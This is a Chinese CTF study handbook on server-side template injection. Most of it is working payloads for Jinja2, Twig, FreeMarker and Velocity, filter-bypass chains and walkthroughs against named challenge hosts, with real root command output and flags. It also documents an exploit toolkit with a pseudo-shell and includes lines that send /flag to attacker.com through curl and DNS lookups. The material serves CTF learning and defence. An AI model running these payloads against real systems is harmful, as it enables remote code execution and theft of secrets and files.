---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '408d6739-51a3-43c9-b772-a005bf841bfd'
  PropagateID: '408d6739-51a3-43c9-b772-a005bf841bfd'
  ReservedCode1: '22f39af1-a01c-4cde-aa21-6118559aea2a'
  ReservedCode2: '22f39af1-a01c-4cde-aa21-6118559aea2a'
---

# CTF Web 知识点 — SSTI 模板注入实战利用手册

> 补充日期：2026-08-07 | 对应题目：第21题 Simple SSTI
> 本文侧重实战解题流程与利用链速查，理论概念参见 CTF解题笔记本.md 中的"SSTI 模板注入"专题。

---

## 1. SSTI 解题标准流程

```
Step 1: 确认输入回显 → 用户输入是否原样出现在响应中
Step 2: 注入数学表达式 → {{7*7}} 返回 49 即确认 SSTI
Step 3: 模板引擎识别 → 差异化 payload 确定引擎类型
Step 4: 构造利用链 → 根据引擎类型选择对应利用方式
Step 5: 获取 flag → 读配置 / 读文件 / 命令执行
```

### 1.1 关键注意点

- **URL 编码**：`{` `}` `'` `"` 等特殊字符在 GET 参数中需 URL 编码（`%7B` `%7D` `%27` `%22`），curl 和 requests 会自动处理
- **POST vs GET**：POST 请求体中花括号不需要编码，但需要注意 Content-Type
- **回显位置**：有些题目回显在 HTML 注释中、HTTP 头中、Cookie 中，需全面检查
- **无回显场景**：使用时间盲注（`{% if ... %}{{7*7}}{% endif %}`）或 OOB 外带

---

## 2. 模板引擎识别决策树

```
注入 {{7*7}}
├── 返回 49 → 存在 SSTI，继续识别
│   注入 {{7*'7'}}
│   ├── 返回 7777777 → Jinja2 (Python/Flask)
│   ├── 返回 49      → Twig (PHP/Symfony)
│   └── 报错         → 其他引擎，继续测试
│
├── 返回 {{7*7}}（原样输出）→ 不是 {{ }} 语法引擎
│   注入 ${7*7}
│   ├── 返回 49 → FreeMarker (Java) / Mako (Python)
│   注入 {7*7}
│   ├── 返回 49 → Smarty (PHP)
│   注入 #{7*7}
│   ├── 返回 49 → Ruby ERB / Pug (Node.js)
│
└── 返回空/报错 → 可能被 WAF 拦截，尝试编码绕过
```

### 2.1 引擎特征对照表

| 模板引擎 | 语言 | 语法 | 检测表达式 | 特征返回值 |
|----------|------|------|-----------|-----------|
| Jinja2 | Python (Flask) | `{{ }}` `{% %}` | `{{7*'7'}}` | `7777777` |
| Twig | PHP (Symfony) | `{{ }}` `{% %}` | `{{7*'7'}}` | `49` |
| Smarty | PHP | `{$ }` | `{$left}` 开方 | `49` |
| FreeMarker | Java | `${ }` `<# >` | `${7*7}` | `49` |
| Velocity | Java | `#set()` `$` | `#set($a=7*7)$a` | `49` |
| Mako | Python | `${ }` | `${7*7}` | `49` |
| Pug | Node.js | `#{ }` | `#{7*7}` | `49` |
| ERB | Ruby | `<%= %>` | `<%= 7*7 %>` | `49` |

---

## 3. Jinja2 (Flask) 利用链速查

CTF 中最常考的 SSTI 引擎。以下按难度从低到高排列。

### 3.1 最简利用（无过滤）

```python
# 1. 读取 Flask 配置（含 SECRET_KEY）
{{config}}

# 2. 读取单个配置项
{{config['SECRET_KEY']}}
{{config.SECRET_KEY}}

# 3. 通过 cycler 全局函数 → os 模块 → 命令执行
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 4. 通过 lipsum 全局函数 → os 模块 → 命令执行
{{lipsum.__globals__.os.popen('cat /flag').read()}}

# 5. 通过 request 对象 → Flask app → config
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['SECRET_KEY']}}
```

### 3.2 Python 魔术方法链遍历

当上述快捷方式被过滤时，通过 Python 对象的魔术方法逐步遍历到 `os` 模块：

```
''.__class__                    → <class 'str'>
''.__class__.__mro__            → (<class 'str'>, <class 'object'>)
''.__class__.__mro__[1]         → <class 'object'>  (基类)
''.__class__.__mro__[1].__subclasses__()  → 所有子类列表

→ 找到 os._wrap_close / subprocess.Popen / catch_warnings 等可利用类
→ 通过 __init__.__globals__ 访问该类加载时的全局命名空间
→ 从中获取 os.system / os.popen / __builtins__ 等
```

**常用 payload：**

```python
# 通过 __subclasses__ 找到 os._wrap_close（索引因环境而异）
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat /flag') }}

# 通用遍历法（不依赖固定索引）
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()") }}
  {% endif %}
{% endfor %}
```

**如何确定 `__subclasses__` 索引：**

```python
# 先输出所有子类及其索引
{% for i in range(200) %}{{i}}: {{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}
{% endfor %}

# 找到 os._wrap_close 的索引后，替换上面 payload 中的数字
```

### 3.3 各全局对象入口汇总

| 入口对象 | 访问方式 | 可达目标 |
|---------|---------|---------|
| `config` | `{{config}}` | Flask 配置（SECRET_KEY、DEBUG 等） |
| `request` | `{{request}}` | HTTP 请求对象 → Flask app → config |
| `cycler` | `{{cycler.__init__.__globals__}}` | 全局命名空间 → os 模块 |
| `lipsum` | `{{lipsum.__globals__}}` | 全局命名空间 → os 模块 |
| `joiner` | `{{joiner.__init__.__globals__}}` | 全局命名空间 → os 模块 |
| `namespace` | `{{namespace.__init__.__globals__}}` | 全局命名空间 → os 模块 |
| `get_flashed_messages` | `{{get_flashed_messages.__globals__}}` | 全局命名空间 → `__builtins__` |
| `url_for` | `{{url_for.__globals__}}` | 全局命名空间 → os 模块 |
| `range` | `{{range.__init__.__globals__}}` | 全局命名空间（部分版本可用） |

### 3.4 get_flashed_messages 利用链（最灵活）

```python
# 通过 get_flashed_messages → __builtins__ → eval → 任意代码执行
{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('id').read()") }}

# 执行带参数的命令
{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()") }}
```

---

## 4. 绕过技巧速查表

### 4.1 关键词过滤绕过

| 被过滤 | 绕过方法 | 示例 |
|--------|---------|------|
| `.` (点号) | 用 `[]` 访问属性 | `['__class__']` 代替 `.__class__` |
| `_` (下划线) | 十六进制 `\x5f` 或 `|attr()` | `\x5f\x5fclass\x5f\x5f` 或 `\|attr('\x5f\x5fclass\x5f\x5f')` |
| `__` (双下划线) | `|attr()` + 拼接 | `\|attr('__cla'+'ss__')` |
| `os` | 十六进制或拼接 | `\x6f\x73` 或 `'o'~'s'` |
| `system` | 拼接 | `'sys'~'tem'` |
| `{{` | 用 `{% %}` 标签 | `{%print(config)%}` 或 `{%if config%}{{config}}{%endif%}` |
| `引号 ' "` | 用 `request` 对象传参 | `{{ ()\|attr(request.args.a) }}` + `?a=__class__` |
| `config` | 用 `request` 链间接访问 | `{{request.application.__self__.config}}` |
| 数字 | 用 `count` 等 | `{{(()|count)}}` → 0 |

> **⚠️ `|attr()` 语法坑点**：Jinja2 中 `|attr()` 过滤器后**不能直接跟** `.` 或 `[]`，会报 `TemplateSyntaxError: expected token 'end of print statement'`。必须用**括号包裹** `(obj|attr('x'))` 后再链式访问。详见第 11 章 11.4 节实测验证。

### 4.2 request 对象绕过法（最灵活）

当大量关键词被过滤时，将敏感字符串通过 URL 参数传入，模板中用 `request` 引用：

```python
# URL: /?flag={{()|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
# 等价于: {{().__class__.__mro__}}

# 完整利用链（全部参数化）
# URL: /?flag={{()|attr(request.args.c)|attr(request.args.m)|attr(request.args.s)()|attr(request.args.i)|attr(request.args.g)|attr(request.args.b)|attr(request.args.e)(request.args.cmd)}}&c=__class__&m=__mro__&s=__subclasses__&i=__init__&g=__globals__&b=__builtins__&e=eval&cmd=__import__('os').popen('cat /flag').read()
```

### 4.3 编码绕过

```python
# Jinja2 中字符串支持十六进制、八进制、Unicode 编码
{{'\x5f\x5fclass\x5f\x5f'}}      → '__class__'
{{'\137\137class\137\137'}}       → '__class__' (八进制)
{{'\u005f\u005fclass\u005f\u005f'}} → '__class__' (Unicode)

# 字符串拼接
{{'__cla'+'ss__'}}    → '__class__'
{{'__cla'~'ss__'}}    → '__class__' (Jinja2 字符串连接符)

# chr() 函数
{{chr(95)~chr(95)~'class'~chr(95)~chr(95)}}  → '__class__'
```

---

## 5. 其他引擎利用链

### 5.1 Twig (PHP/Symfony)

```twig
# 基本确认
{{7*'7'}}  {# 49 #}

# 命令执行 (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# 命令执行 (Twig 2.x+)
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

### 5.2 Smarty (PHP)

```smarty
# 基本
{if phpinfo()}{/if}
{if system('id')}{/if}
{system('cat /flag')}
```

### 5.3 FreeMarker (Java)

```ftl
# 基本确认
${7*7}  → 49

# 命令执行
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 替代语法（绕过 <# 过滤）
[#assign cmd="freemarker.template.utility.Execute"?new()]${cmd("cat /flag")}

# 读取文件
<#assign is=object?api.class.protectionDomain.classLoader.loadClass("java.io.FileInputStream")?new("/flag")>
${is.read()}
```

### 5.4 Velocity (Java)

```velocity
# 基本确认
#set($a=7*7)$a  → 49

# 命令执行
#set($e="exp")
#set($c=$e.inspect("java.lang.Runtime"))
#set($str=$c.getMethod("getRuntime",null).invoke(null,null))
#set($exec=$str.getClass().forName("java.lang.Runtime"))
$exec.getMethod("exec",$str.getClass()).invoke($str,"id")
```

---

## 6. 盲注 SSTI（无回显场景）

当页面不直接显示模板执行结果时：

### 6.1 时间盲注

```python
# Jinja2: 通过 if 条件 + sleep 制造延迟
{% if ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('sleep 3').read() %}{% endif %}

# 测量响应时间判断条件真假
import time
start = time.time()
requests.get(url + "?flag={% if config.DEBUG %}1{% endif %}")
elapsed = time.time() - start
# 有延迟 → 条件为真
```

### 6.2 OOB 外带

```python
# 通过 DNS/HTTP 外带数据
{{lipsum.__globals__.os.popen('curl http://attacker.com/$(cat /flag)').read()}}
{{lipsum.__globals__.os.popen('nslookup $(cat /flag).attacker.com').read()}}
```

### 6.3 反射型盲注（利用日志）

```python
# 将结果写入文件再读取
{{lipsum.__globals__.os.popen('cat /flag > /tmp/out').read()}}
# 然后通过文件读取漏洞或 SSTI 读取 /tmp/out
```

---

## 7. 实战解题 Check List

```
□ 1. 确认参数回显（输入特殊字符串看是否原样输出）
□ 2. 注入 {{7*7}} → 49 确认 SSTI
□ 3. 注入 {{7*'7'}} 识别引擎
□ 4. 尝试直接 {{config}} 读 Flask 配置
□ 5. 尝试 {{cycler.__init__.__globals__.os.popen('ls /').read()}}
□ 6. 尝试 {{lipsum.__globals__.os.popen('cat /flag').read()}}
□ 7. 尝试 {{get_flashed_messages.__globals__.__builtins__.eval(...)}}
□ 8. 如有过滤 → request 对象绕过法
□ 9. 如无回显 → 时间盲注 / OOB 外带
□ 10. flag 位置：/flag、/flag.txt、环境变量 FLAG、config SECRET_KEY
```

---

## 8. 靶场搭建参考

本地搭建 SSTI 靶场用于练习（见 .temp/security-scripts/ssti_lab/app.py）：

```python
from flask import Flask, request, render_template_string
import random, string

app = Flask(__name__)
app.config['SECRET_KEY'] = "flag{" + "".join(random.choices(string.ascii_lowercase + string.digits, k=32)) + "}"

@app.route("/")
def index():
    name = request.args.get("flag", "guest")
    # 漏洞点：直接拼接用户输入到模板字符串
    return render_template_string(f"Hello, {name}!")

app.run(host="127.0.0.1", port=5000)
```

---

## 9. 防御措施

| 防御方式 | 说明 |
|---------|------|
| 使用 `render_template()` | 从模板文件渲染，不拼接用户输入 |
| 禁用 `render_template_string()` | 避免动态模板字符串 |
| 沙箱模式 (SandboxedEnvironment) | Jinja2 沙箱限制可访问的对象和方法 |
| 输入白名单校验 | 对用户输入做严格字符白名单过滤 |
| 避免在模板中暴露敏感对象 | 不将 config、request 等对象注入模板上下文 |
| 移除未使用的全局函数 | 不注册 `cycler`、`lipsum` 等不必要的函数 |

---

## 10. 自动化工具 — web_ssti_toolkit.py

> 位置：`Web/tools/web_ssti_toolkit.py`
> 完整流程：检测 → 引擎识别 → 攻击面探测 → WAF 探测与绕过 → 命令执行 / 伪 shell

### 功能概述

| 模块 | 功能 | 说明 |
|------|------|------|
| 检测 | 数学表达式注入 | `{{7*7}}` → 49 确认 SSTI |
| 识别 | 引擎指纹差异化 | 通过 `{{7*'7'}}` 等区分 Jinja2/Twig/Smarty 等 |
| 探测 | config 泄漏 / 全局对象 / subclasses | 自动提取 SECRET_KEY 和 flag |
| WAF | 字符级 + 关键字级探测 | 逐个测试 `.` `_` `[]` 引号 `os` `import` 等 |
| 绕过 | 10 种策略自动匹配 | 无过滤 / `[]` / `\|attr()` / `request.args` / `~`拼接 |
| 利用 | 9 条 RCE 链自动尝试 | 全局函数链 / builtins 链 / config 链 / subclasses 链 |
| 伪shell | 逐条执行命令 | 支持 `flag` / `env` / `source` / `ls_flag` 快捷命令 |

### 使用方式

```bash
# 全自动检测 + 探测 + 利用
python web_ssti_toolkit.py -u "http://target/" --param name

# 指定引擎 + 单命令执行
python web_ssti_toolkit.py exploit -u "http://target/" --param name --engine jinja2 --exec "id"

# 伪 shell 模式（逐条执行命令）
python web_ssti_toolkit.py exploit -u "http://target/" --param name --engine jinja2 --shell

# WAF 探测
python web_ssti_toolkit.py exploit -u "http://target/" --param name --engine jinja2 --waf

# 读取文件
python web_ssti_toolkit.py exploit -u "http://target/" --param name --engine jinja2 --read /etc/passwd

# 信息收集
python web_ssti_toolkit.py exploit -u "http://target/" --param name --engine jinja2 --info

# POST 方式
python web_ssti_toolkit.py -u "http://target/" --param name --method POST --data "name=test" --shell

# 查看 payload 速查表
python web_ssti_toolkit.py cheatsheet
```

### 支持的模板引擎

Jinja2 (Flask) / Twig (Symfony) / Freemarker (Java) / Velocity (Java) / Smarty (PHP) / Mako (Python)

### WAF 绕过策略（10 种，实战验证）

| 策略 | 被过滤项 | 绕过方法 |
|------|---------|---------|
| 无过滤 | 无 | 原始链 `lipsum.__globals__.os.popen()` |
| `[]` 替代 | `.` | `lipsum['__globals__']['os']['popen']()` |
| `\|attr` 替代 | `_` | `(lipsum\|attr('__globals__')).os.popen()` |
| `\|attr` + 括号 | `.` `_` | `(lipsum\|attr('__globals__'))['os'].popen()` |
| 全 `\|attr` 链 | `.` `_` `[]` | `((lipsum\|attr('__globals__'))\|attr('__getitem__')('os'))\|attr('popen')()` |
| `request.args` | 引号 | `(lipsum\|attr(request.args.g)).os.popen(request.args.c).read()` |
| 极端全过滤 | `.` `_` `[]` 引号 | 全 `request.args` 传参 |
| 关键字 `request.args` | `os`/`popen` 等关键字 | 所有关键字通过 `request.args` 传参 |
| 关键字 + 下划线 | `_` + 关键字 | `request.args` + `\|attr` |
| 关键字 + 下划线 + 点号 | `.` `_` + 关键字 | 全 `request.args` + `__getitem__` |

### 关键设计要点

1. **`|attr()` 必须括号包裹**：Jinja2 中 `|` 优先级低于 `.` 和 `[]`
2. **dict 不能用 `|attr` 取值**：需用 `[]` 或 `|attr('__getitem__')('key')`
3. **`request.args` 绕过法**：将被过滤的字符串作为 URL 参数传递，payload 本身不含被过滤内容
4. **`~` 拼接绕过**：`'o'~'s'` 拼接出 `os` 字符串
5. **基准对比清洗**：通过对比无 payload 的基准页面，精确提取 RCE 输出

---

## 11. 参考链

- [CTF解题笔记本 第21题：SSTI 模板注入](../CTF解题笔记本.md)
- [SSTI 自动化检测工具 web_ssti_toolkit.py](../tools/web_ssti_toolkit.py)
- [PayloadAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)

---

## 12. 靶机实战案例 — Simple SSTI 完整利用演示

> 实测日期：2026-08-07 | 靶机：http://160.202.254.160:12115/?flag=
> 以下所有 payload 均在靶机上实际验证通过，附真实输出。

### 12.1 靶机环境概述

通过 SSTI 读取 `app.py` 源码（`{{lipsum.__globals__.os.popen('cat app.py').read()}}`），确认环境：

```python
from flask import Flask, request, render_template_string, render_template
from subprocess import getoutput as shell

app = Flask(__name__)
flag = shell('echo $FLAG')          # flag 来自环境变量 $FLAG
app.config['SECRET_KEY'] = flag     # 存入 Flask 配置

@app.route('/', methods=['GET', "POST"])
def index():
    if request.method == "GET":
        content = request.args.get('flag')
        if content is not None and len(content) >= 1:
            html = '''%s''' % content          # 漏洞点：直接拼接用户输入
            return render_template_string(html)
        else:
            html = """You need pass in a parameter named flag。"""
            return render_template('index.html', html=html)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
```

**关键环境信息：**

| 项目 | 值 |
|------|---|
| Python 版本 | 3.7.9 (Alpine Docker) |
| Web 框架 | Flask + Werkzeug (debug=True) |
| 运行权限 | root (uid=0) |
| Flag 来源 | 环境变量 `$FLAG` → `app.config['SECRET_KEY']` |
| 过滤 | 无（`%s` 直接拼接，无任何 WAF） |
| Werkzeug PIN | 可访问 `?__debugger__=yes` 调试控制台（需 PIN） |
| Flag | `flag{34c812fc9e6bc952528326eb0a7a478e}` |

### 12.2 命令执行（RCE）利用链实测

三条独立利用链全部以 root 权限成功执行命令：

**利用链 1：lipsum（最简洁）**

```python
# Payload
{{ lipsum.__globals__.os.popen('id').read() }}

# 输出
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**利用链 2：cycler**

```python
# Payload
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 输出（同上）
uid=0(root) gid=0(root) groups=0(root),...
```

**利用链 3：get_flashed_messages（最灵活，可达 eval）**

```python
# Payload
{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('id').read()") }}

# 输出（同上）
uid=0(root) gid=0(root) groups=0(root),...
```

### 12.3 `__subclasses__` 遍历链实测

当 `lipsum`/`cycler`/`get_flashed_messages` 等全局函数被禁用时，通过 Python 对象模型遍历到 `os` 模块。

**方法 1：for 循环遍历法（不依赖固定索引，推荐）**

```python
# catch_warnings 类 → __builtins__ → eval
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# 输出
uid=0(root) gid=0(root) groups=0(root),...
```

```python
# os._wrap_close 类 → 直接访问 os.popen
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == '_wrap_close' %}
    {{ c.__init__.__globals__['popen']('id').read() }}
  {% endif %}
{% endfor %}

# 输出
uid=0(root) gid=0(root) groups=0(root),...
```

> **注意**：`os._wrap_close` 的 `__init__.__globals__` 中 `system` 函数返回退出码（不回显输出），需用 `popen` 才能获取命令输出。`system('id')` 返回 `0`（成功但无输出）。

**方法 2：固定索引法（需先探测索引）**

```python
# Step 1: 探测 os._wrap_close 的索引
{% for i in range(200) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == '_wrap_close' %}
    {{ i }}
  {% endif %}
{% endfor %}

# 输出: 127 (本靶机环境)
# catch_warnings 索引: 177

# Step 2: 用固定索引执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['popen']('cat /proc/self/environ').read() }}

# 输出（环境变量，含 FLAG）
HOSTNAME=eaf4eab35fe5df0460caae7caf384c3f PYTHON_PIP_VERSION=20.3.3 ... FLAG=flag{34c812fc9e6bc952528326eb0a7a478e}
```

> **索引因环境而异**：不同 Python 版本、不同已导入模块会导致 `__subclasses__()` 列表顺序不同。固定索引法必须先探测，for 循环法更通用。

### 12.4 WAF 绕过实测

**关键发现：Jinja2 `|attr()` 语法坑点**

在 Jinja2 模板中，`|attr()` 过滤器的优先级低于 `.` 和 `[]`，因此以下写法会报 `TemplateSyntaxError`：

```python
# ❌ 报错: expected token 'end of print statement', got '.'
{{ lipsum|attr('__globals__').os.popen('id').read() }}

# ❌ 报错: expected token 'end of print statement', got '['
{{ lipsum|attr('__globals__')['os'].popen('id').read() }}
```

正确写法是**用括号包裹** `|attr()` 表达式：

```python
# ✅ 正确: 括号包裹后可继续用 . 链式访问
{{ (lipsum|attr('__globals__')).os.popen('id').read() }}

# ✅ 正确: 括号包裹后可继续用 [] 下标访问
{{ (lipsum|attr('__globals__'))['os'].popen('id').read() }}

# 输出
uid=0(root) gid=0(root) groups=0(root),...
```

**各绕过场景实测结果：**

| 被过滤 | 绕过 Payload | 靶机输出 | 状态 |
|--------|-------------|---------|------|
| `.` (点号) | `lipsum['__globals__']['os']['popen']('id')['read']()` | `uid=0(root)...` | 成功 |
| `.` + `_` | `(lipsum\|attr('__globals__'))['os'].popen('id').read()` | `uid=0(root)...` | 成功 |
| `.` + `_` + `{% set %}` | `{% set g=lipsum\|attr('__globals__') %}{{ g['os'].popen('id').read() }}` | `uid=0(root)...` | 成功 |
| `.` + `_` + `[]` | `((lipsum\|attr('__globals__'))\|attr('__getitem__')('os'))\|attr('popen')('id')\|attr('read')()` | `uid=0(root)...` | 成功 |
| `.` + `_` + `[]` + 引号 | `(lipsum\|attr(request.args.g)).os.popen(request.args.c).read()` + `?g=__globals__&c=id` | `uid=0(root)...` | 成功 |

> **极极端场景**（`.` `[]` `_` `引号` 全过滤）：使用 `|attr()` + `__getitem__` + `request.args` 组合，详见上表第 4 行。全链不使用任何 `.`、`[]`、`_`、引号。

> **dict 取值注意**：`|attr('os')` 对 dict 对象**不生效**（报 `'dict object' has no attribute 'os'`），因为 `|attr` 底层先尝试 `getattr()` 再尝试 `__getitem__()`，但 Jinja2 环境的 sandbox 模式下不自动 fallback。对 dict 取值必须用 `[]` 或 `|attr('__getitem__')('key')`。

### 12.5 文件系统操作实测

```python
# 写入文件
{{ lipsum.__globals__.os.popen('echo pwned > /tmp/pwned').read() }}
# 输出: (空)

# 读取文件
{{ lipsum.__globals__.os.popen('cat /tmp/pwned').read() }}
# 输出: pwned

# 读取应用源码
{{ lipsum.__globals__.os.popen('cat app.py').read() }}
# 输出: (完整 Flask 源码，见 11.1 节)

# 读取环境变量（flag 在此）
{{ lipsum.__globals__.os.popen('cat /proc/self/environ').read() }}
# 输出: HOSTNAME=... FLAG=flag{34c812fc9e6bc952528326eb0a7a478e}
```

### 12.6 flag 获取路径汇总

本题 flag 有三条独立获取路径，任意一条即可：

```
路径 1 (最简): {{ config }}
  → 输出 Flask 配置字典，SECRET_KEY 即 flag
  → flag{34c812fc9e6bc952528326eb0a7a478e}

路径 2 (RCE 读环境变量): {{ lipsum.__globals__.os.popen('cat /proc/self/environ').read() }}
  → 输出环境变量，FLAG=flag{...}

路径 3 (RCE 执行 shell): {{ lipsum.__globals__.os.popen('echo $FLAG').read() }}
  → 直接执行 shell 命令获取环境变量
```

### 12.7 实战经验总结

1. **先试 `{{config}}`**：Flask 题目中 flag 常放在 SECRET_KEY，一行 payload 即可获取
2. **`lipsum` 链优于 `__subclasses__` 链**：更简短、不依赖索引、不易被过滤
3. **`system()` vs `popen()`**：`os.system()` 返回退出码不回显输出；`os.popen().read()` 才能获取命令输出
4. **`|attr()` 必须括号包裹**：Jinja2 中 `|` 优先级低于 `.`/`[]`，`obj|attr('x').y` 会语法报错
5. **dict 不能用 `|attr` 取值**：`|attr` 对 dict 不自动 fallback 到 `__getitem__`，需用 `[]` 或 `|attr('__getitem__')('key')`
6. **`__subclasses__` 索引因环境而异**：固定索引法需先探测，for 循环遍历法更通用
7. **debug=True 额外风险**：Werkzeug 调试控制台 (`?__debugger__=yes`) 可通过 PIN 获取交互式 Python Shell
8. **`/proc/self/environ`**：Linux 下读取环境变量的通用技巧，flag 常通过环境变量注入

---

## 13. 极端 WAF 绕过案例 — POST + 全字符拼接链

> 实测日期：2026-08-08 | 靶机：`dasctf.com/login` (POST, Jinja2)
> 以下所有 payload 均在靶机上实际验证通过。

### 13.1 靶机环境概述

| 项目 | 值 |
|------|---|
| 靶机 | `http://fc0b9fb25c5f05ab84fda9fa.http-ctf2.dasctf.com/login` |
| 请求方式 | POST (`username`=注入点, `password`=必填) |
| Python 版本 | 3.8.0 (Docker/K8s) |
| Web 框架 | Flask + Werkzeug |
| 运行权限 | root (uid=0) |
| Flag 来源 | 环境变量 `FLAG` |
| Flag | `CTF2{08dea0d4-82b1-48e5-9a3e-d5144c15f1bb}` |

### 13.2 WAF 过滤规则（子串匹配）

| 类别 | 被过滤内容 |
|------|-----------|
| 字符级 | 空格、`_`、`"`、`'`、`[` |
| 关键字级 | `os`、`popen`、`system`、`import`、`eval`、`globals`、`builtins`、`class`、`init`、`mro`、`request`、`getitem`、`pop`、`form` |

> **排查技巧**：用 `dict(keyword=1)` 快速测试某个关键字是否被 WAF 拦截（作为 dict key 名不会被 Python 语法约束）。注意 WAF 是子串匹配，`most`/`cos`/`bosh` 中的 `os` 也会触发。

> **陷阱**：空格被过滤时返回 `in blacklist`，容易被误判为 `in` 关键字被过滤。实际 `in` 不在黑名单（`dict(in=1)` 不触发），`string` 虽含 `in` 子串但未被拦截。

### 13.3 字符提取与拼接技术

当引号、下划线、方括号、`request` 全部被过滤时，常规绕过方法全部失效。核心突破：

**1. 从 `lipsum|string` 提取字符**

```
lipsum → <function generate_lorem_ipsum at 0x7fac206809d0>
lipsum|string|list → ['<','f','u','n','c','t','i','o','n',' ','g','e','n','e','r','a','t','e','_','l','o','r','e','m','_','i','p','s','u','m',...]
```

用 `|batch(n)|first|last` 提取第 n-1 个字符（无需 `[]`）：

```
lipsum|string|list|batch(19)|first|last → '_'   (index 18)
lipsum|string|list|batch(11)|first|last → 'g'   (index 10)
lipsum|string|list|batch(21)|first|last → 'o'   (index 20)
```

**2. 用 `dict(c=1)|list|first` 补充缺失字符**

lipsum 函数名不含 `b`、`v` 等字符，用 dict 补充：

```
dict(b=1)|list|first → 'b'
dict(v=1)|list|first → 'v'
```

**3. 用 `~` 拼接成任意字符串**

```jinja2
# 构建 '__globals__'（无引号无下划线）
(lipsum|string|list|batch(19)|first)|last ~
(lipsum|string|list|batch(19)|first)|last ~
(lipsum|string|list|batch(11)|first)|last ~  # g
(lipsum|string|list|batch(20)|first)|last ~  # l
(lipsum|string|list|batch(21)|first)|last ~  # o
dict(b=1)|list|first ~                        # b
(lipsum|string|list|batch(16)|first)|last ~  # a
(lipsum|string|list|batch(20)|first)|last ~  # l
(lipsum|string|list|batch(28)|first)|last ~  # s
(lipsum|string|list|batch(19)|first)|last ~  # _
(lipsum|string|list|batch(19)|first)|last    # _
→ '__globals__'
```

### 13.4 完整利用链

```
# 属性名全部用字符拼接构建，|attr 替代 . 和 []
# dict.get(key) 替代 dict[key]

lipsum|attr(__globals__拼接)              → globals dict
globals|attr(get拼接)(os拼接)             → os module
os|attr(popen拼接)(cmd拼接)               → file object
(file|attr(read拼接))()                   → 命令输出
```

**实际 payload 结构**（约 1153 字符，无空格）：

```jinja2
{{(((lipsum|attr(GLOBALS_STR))|attr(GET_STR)(OS_STR))|attr(POPEN_STR)(CMD_STR))|attr(READ_STR))()}}
```

### 13.5 实测结果

```
id   → uid=0(root) gid=0(root) groups=0(root)
env  → ... FLAG=CTF2{08dea0d4-82b1-48e5-9a3e-d5144c15f1bb}
ls   → app.py  static  templates
pwd  → /app
```

### 13.6 关键经验

1. **`batch|first|last` 是终极字符提取法**：当引号、下划线、方括号全被过滤时，`string|list|batch(n)|first|last` 不需要任何被过滤字符即可提取任意位置字符
2. **`dict(c=1)|list|first` 补充缺失字符**：lipsum 函数名不含的字符可用此法获取
3. **`|attr` 优于 `getattr`**：`getattr` 在 Jinja2 sandbox 中不可用（500），`|attr` 是 filter 不受限制
4. **`dict.get` 替代 `[]`**：`dict|attr('get')(key)` 绕过方括号过滤，且 `get` 不被过滤
5. **bound method 需 `()` 调用**：`(obj|attr('read'))()` 而非 `obj|attr('read')`
6. **空格过滤对策**：使用无参数命令（`env`/`ls`/`pwd`）或重定向（`cat</flag`）绕过空格限制
7. **POST 方式 WAF 更严格**：POST body 中 `requests` 库的编码行为需注意，确保 payload 不被二次处理
8. **`string` 含 `in` 但不被过滤**：确认 WAF 的子串匹配规则时不能凭直觉，必须逐个验证

---

## 14. 极端 WAF 绕过案例 — `|join` 拼接 + `[]` getattr fallback (GET)

> 实测日期：2026-08-08 | 靶机：NewStarCTF / DASCTF CTF2 (GET, Jinja2)
> 以下所有 payload 均在靶机上实际验证通过，自动化工具 `web_ssti_toolkit.py` 策略 11/12 已覆盖。

### 14.1 靶机环境概述

| 项目 | 值 |
|------|---|
| 靶机 | `http://f358d6903791379079686173.http-ctf2.dasctf.com:80/` |
| 请求方式 | GET (`name`=注入点) |
| 注入参数 | `name` |
| WAF 响应特征 | `Get Out!Hacker!` |
| Flag 文件 | `/flag_in_h3r3_52daad` |
| Flag | `CTF2{a0d40185-5da1-42c0-bf04-fc0349c0ca2b}` |

### 14.2 WAF 过滤规则（子串匹配，只检查 `name` 参数值）

| 类别 | 被过滤内容 |
|------|-----------|
| 字符级 | `~`（波浪号）、空格、`"`（双引号） |
| 关键字级 | `attr`/`getattr`、`class`/`mro`/`subclasses`、`globals`/`builtins`/`init`、`popen`/`system`/`eval`、`environ`/`application`、`flag`/`cat`、`request`（变量存在但属性返回500） |

> **可用资源**：`lipsum`/`cycler`/`joiner`/`namespace`、`__dict__`/`__base__`/`__module__`/`__name__`/`__doc__`/`__getitem__`/`__import__`、`os`/`open`/`read`/`import`、`|join`/`|format`/`|string`/`|list`/`|batch`、`.`/`[]`/`()`/`{}`/`|`/`'`、Tab(`%09`)

### 14.3 核心突破技术

